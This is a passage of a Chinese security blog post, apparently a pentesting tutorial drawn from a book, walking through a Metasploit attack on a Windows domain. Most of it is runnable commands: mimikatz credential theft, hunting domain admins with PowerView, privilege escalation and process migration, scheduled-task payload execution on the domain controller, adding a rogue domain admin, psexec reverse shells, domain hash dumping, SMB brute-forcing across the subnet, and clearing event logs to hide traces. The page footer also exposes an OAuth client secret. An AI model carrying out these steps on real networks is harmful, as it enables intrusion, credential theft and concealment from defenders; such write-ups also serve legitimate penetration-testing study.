+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt;sysinfo <span class="comment">#发现没有SYSTEM权限</span></span><br><span class="line">		   &gt;upload /home/64.exe c:\ <span class="comment">#上传mimikatz，如果目标机64位，记得先将mimicatz进程迁移到一个64位进程中(migrate 123，再load)</span></span><br><span class="line">		   &gt;shell</span><br><span class="line"></span><br><span class="line">C:\windwos\system32&gt;<span class="built_in">cd</span> \</span><br><span class="line">				  C:&gt;64.exe <span class="comment">#比如显示了个域用户叫 yuleiyun.cc</span></span><br><span class="line">                    &gt;net user yuleiyun.cc /domain <span class="comment">#查看域用户权限</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>4.powershell寻找域管在线服务</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\yuleiyun.cc&gt;powershell.exe -<span class="built_in">exec</span> bypass -Command <span class="string">&quot;&amp; &#123;import-Moudle .\powerview.ps1; invoke-UserHunter&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个power view脚本<code>来获取当前域管理员在线登录的服务器</code></p>
+<p>好，假如看到域管理员当前在线登录的机器主机名为yuleiyun30，IP为xxxx，此时需要入侵此服务器，然后将其迁移到域管理登录所在的进程，这样便有了 <strong>域管理权限</strong></p>
+<p><strong>5.获取域管理权限</strong></p>
+<p>加入已获取主机名为yuleiyun30的服务器权限，然后渗透域控</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt;getuid <span class="comment">#查看当前权限</span></span><br><span class="line">getsystem <span class="comment">#提权，假如成了</span></span><br><span class="line"></span><br><span class="line">getuid <span class="comment"># 现在的uid是域管理员了</span></span><br><span class="line">ps <span class="comment">#找到域管理所在进程</span></span><br><span class="line"></span><br><span class="line">getuid <span class="comment">#LALALA\yuleiyun</span></span><br><span class="line">getpid</span><br><span class="line">migrate 30568 <span class="comment">#Meterpreter shell进程迁移到此进程中</span></span><br><span class="line"><span class="comment">#成功后就获得了域管理权限</span></span><br><span class="line"><span class="comment">#也可以msf窃取令牌，获得权限</span></span><br><span class="line"></span><br><span class="line">shell</span><br><span class="line"></span><br><span class="line">C:\windwos\system32&gt; net time</span><br><span class="line"><span class="comment">#显示 Current time as \\yuleiyun64.... IP地址为...</span></span><br><span class="line"><span class="comment">#即得到域服务器的主机名</span></span><br><span class="line"><span class="comment">#好好好</span></span><br><span class="line"></span><br><span class="line">		net use \\yuleiyun64....\c$ <span class="comment">#IPC$渗透</span></span><br><span class="line">		schtasks \\yuleiyun64.... 18:12:13 c:\payload.exe<span class="comment">#添加计划任务</span></span><br></pre></td></tr></table></figure>
+
+<p>现在是在域管理员权限下了，给域控添加一个管理员账户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\User\..:&gt;net user yuleiyun111 123456 /ad /domain <span class="comment">#添加域管理员账户</span></span><br><span class="line">			net group <span class="string">&quot;domain admins&quot;</span> yuleiyun111 /ad /domain <span class="comment">#添加到组</span></span><br><span class="line">			net group <span class="string">&quot;domain admins&quot;</span> /domain <span class="comment">#查看域管理员组</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>6.登录域控制</strong></p>
+<p>域控权限到手了。登录域控，抓域控的Hash</p>
+<p>常见登录域控方式：</p>
+<blockquote>
+<p>利用IPC上传AT&amp;Schtasks远程执行命令</p>
+<p>利用端口转发或Socks登录域控远程桌面</p>
+<p>登录对方内网的一台计算机使用Pstools工具包中的PsExec反弹Shell</p>
+<p>使用Metasploit下的PsExec、psexec_psh、impacket psexec、pthwinexe、Empire invoke-Psexec等PsExec类工具反弹Shell</p>
+<p>使用Metersploit 下的smb_login反弹Meterpreter</p>
+<p>使用WMI 进行攻击</p>
+<p>PsRemoting posershel远程执行命令</p>
+<p>其他</p>
+</blockquote>
+<p>采用最常见、效果最好的方式：用msf下的PsExec反弹Meterpreter，前提以下两点</p>
+<blockquote>
+<p>MSF中的PsExec模块</p>
+<p>cuestom模块，需要类似Veil类的工具生成免杀的Payload</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf&gt;use exploit/windows/smb/psexec</span><br><span class="line">	&gt; <span class="built_in">set</span> smbuser yuleiyun111</span><br><span class="line">	&gt; <span class="built_in">set</span> smbpass 123456</span><br><span class="line">	&gt;<span class="built_in">set</span> smbdomain LALALA</span><br><span class="line">	&gt;<span class="built_in">set</span> rhost 目标机IP</span><br><span class="line">	&gt;run</span><br></pre></td></tr></table></figure>
+
+<p>反弹成功后，先迁移进程，查看域控的系统信息和sessions</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; migrate 2416</span><br><span class="line">			&gt; getuid <span class="comment">#显示了SYSTEM权限</span></span><br><span class="line">			&gt; getpid <span class="comment">#2416</span></span><br><span class="line">			&gt; sysinfo</span><br><span class="line">			&gt;background <span class="comment">#会话进后台</span></span><br><span class="line">			</span><br><span class="line">	     msf&gt;sessions <span class="comment">#这样下来会有5个</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>webshell反弹-&gt;ipc$入侵-&gt;获取域管在线服务器-&gt;域</p>
+<p>得到域控权限，再来抓Hash</p>
+<blockquote>
+<p>用msf的dumphash或smart_hashdump模块导出用户的Hash</p>
+<p>利用Powershell的相应模块导出Hash</p>
+<p>使用WCE、Mimikatz等工具</p>
+</blockquote>
+<p>这里使用dumphash模块</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use /post/windows/gather/smart_hashdump <span class="comment">#必须SYSTEM权限</span></span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> session 5</span><br><span class="line">run <span class="comment">#抓取域Hash</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>7.SMB爆破内网</strong></p>
+<p>有了域控的密码，接下来只要快速在内网扩大控制权限，具体如下：</p>
+<blockquote>
+<p>利用当前获取的域控账户密码，对整个域控IP段扫描</p>
+<p>使用SMB下的smb_login模块</p>
+<p>端口转发或Socks代理进内网</p>
+</blockquote>
+<p>现在msf添加路由，然后使用smb_login模块或者psexec_scanner模块爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">			&gt; route add 域服务器ip 子网掩码 2 <span class="comment">#添加路由</span></span><br><span class="line">			&gt; search smb_login</span><br><span class="line">			</span><br><span class="line">			&gt;use auxiliary/scanner/smb/smb_login</span><br><span class="line">			&gt;<span class="built_in">set</span> rhosts ip/24   <span class="comment">#添加路由</span></span><br><span class="line">			&gt;<span class="built_in">set</span> smbuser yuleiyu.cc</span><br><span class="line">			&gt;<span class="built_in">set</span> smbpass ...</span><br><span class="line">			&gt;<span class="built_in">set</span> smbdomain LALALA</span><br><span class="line">			&gt;<span class="built_in">set</span> threads 16</span><br></pre></td></tr></table></figure>
+
+<p>开始扫描内网了</p>
+<p>msf &gt; creds 整理扫描结构</p>
+<p>已经获取了大量内网服务器的密码了</p>
+<p>使用Meterpreter的端口转发。或者msf下的Socks4a模块</p>
+<p>这里用Meterpreter的端口转发</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -l 5555 -p 3389 -r 127.0.0.1</span><br><span class="line">			&gt; background</span><br></pre></td></tr></table></figure>
+
+<p>清理日志</p>
+<blockquote>
+<p>删除之前添加的域管理账号</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\windows\system32 &gt; net user yuleiyun111 /del <span class="comment">#删除添加的用户账号</span></span><br><span class="line">					&gt; logoff</span><br></pre></td></tr></table></figure>
+
+<p>删除所有上传的工具</p>
+<p>删除应用程序、系统和安全日志</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; clearev  <span class="comment">#删除日志</span></span><br></pre></td></tr></table></figure>
+
+<p>关闭所有Meterpreter连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(psexec) &gt; sessions</span><br><span class="line">					&gt; sessions -K</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《Web安全攻防渗透测试实战指南》</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/09/30/msf%E6%8A%80%E6%9C%AF/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/msf/" rel="tag">msf</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2023/10/01/vpn%E5%8E%9F%E7%90%86/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            VPN原理浅谈
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2023/09/27/SSRF/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">SSRF危害与利用</div>
+      </a>
+    
+  </nav>
+
+  
+   
+<div class="gitalk" id="gitalk-container"></div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/gitalk/1.7.2/gitalk.min.css">
+
+
+<script src="https://cdn.staticfile.org/gitalk/1.7.2/gitalk.min.js"></script>
+
+
+<script src="https://cdn.staticfile.org/blueimp-md5/2.19.0/js/md5.min.js"></script>
+
+<script type="text/javascript">
+  var gitalk = new Gitalk({
+    clientID: '93da8388ad1469a8be66',
+    clientSecret: '9dea6314b14ae1877632f2bcbe0a639dd4485bb1',
+    repo: 'blogtalk',
+    owner: 'ak005469075',
+    admin: ['ak005469075'],
+    // id: location.pathname,      // Ensure uniqueness and length less than 50
+    id: md5(location.pathname),
+    distractionFreeMode: false,  // Facebook-like distraction free mode
+    pagerDirection: 'last'
+  })
+
+  gitalk.render('gitalk-container')
+</script>
+
+  
+    
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2023
+        <i class="ri-heart-fill heart_icon"></i> 是羽泪云诶
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/favicon.ico" alt="小张之栈"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<script src="https://cdn.staticfile.org/animejs/3.2.1/anime.min.js"></script>
+
+<script src="/js/clickBoom1.js"></script>
+ 
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    
+
+  </div>
+</body>
+
+</html>
